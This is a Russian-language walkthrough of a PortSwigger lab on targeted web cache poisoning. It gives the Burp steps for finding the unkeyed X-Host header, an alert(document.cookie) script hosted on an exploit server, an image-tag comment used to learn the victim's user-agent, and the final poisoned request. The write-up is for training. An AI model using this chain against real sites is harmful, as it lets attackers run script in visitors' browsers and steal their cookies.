Перейдем на уязвимый ресурс

Откроем `Proxy` -> `HTTP history` и найдем запрос 
```
GET / 
```
и обязательно тот, где есть поле` Upgrade-Insecure-Requests: 1`   !!!
и отправим его в `Repeater`

Так же приметим 
```
GET /resources/js/tracking.js
```
его тоже отправим в `Repeater`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/4.%20Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/pics%20for%20walkthrough/1.png)

Далее воспользуемся расширением `Param miner `
Снова нажимем `ПКМ` -> `Extensions` -> `Param miner` ->` Guess Headers` и попробуем найти уязвимые заголовки, которые нам могут помочь
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/4.%20Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/pics%20for%20walkthrough/2.png)

Спустя время в `Target` -> `issues` увидим, что мы нашли уязвимый заголовок - `x-host`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/4.%20Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/pics%20for%20walkthrough/3.png)


Вернемся в Repeater и добавм данный заголовок к нашему запросу
```
x-host:example.com
```

И видим, что при добавлении X-Host: example.com у нас появляется редирект на `example.com `

а так же заголовок
```
Vary: User-Agent
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/4.%20Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/pics%20for%20walkthrough/4.png)

тлично, перейдем в `Exploit server`

Создадим файл `/resources/js/tracking.js`
в котором будет прописано `alert(document.cookie)` и нажмем `Store`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/4.%20Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/pics%20for%20walkthrough/5.png)

А в поле `X-host` вставим URL exploit server'a
```
exploit-0adf006a04c68cce817a656f01f700f7.exploit-server.net
```
и отравим данный запрос
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/4.%20Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/pics%20for%20walkthrough/6.png)

Далее вернемся на корневую страницу в браузере и зайдем в случайный блог и напишем следующий комментарий, который по сути является stored XSS
```
<img src="https://exploit-0adf006a04c68cce817a656f01f700f7.exploit-server.net/test" />
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/4.%20Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/pics%20for%20walkthrough/7.png)

Далее перейдем в Access log и увидим 404 Ошибку 
```
10.0.4.140      2024-06-16 14:22:09 +0000 "GET /test HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```
что не совпадает юзерагент

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/4.%20Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/pics%20for%20walkthrough/8.png)

Исправим и скопипастим юзерагент в наш запрос в Repeater
```
GET / 
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36

X-Host: exploit-0adf006a04c68cce817a656f01f700f7.exploit-server.net
```
отправим запрос и получим уведомление об успешной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/4.%20Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/pics%20for%20walkthrough/9.png)
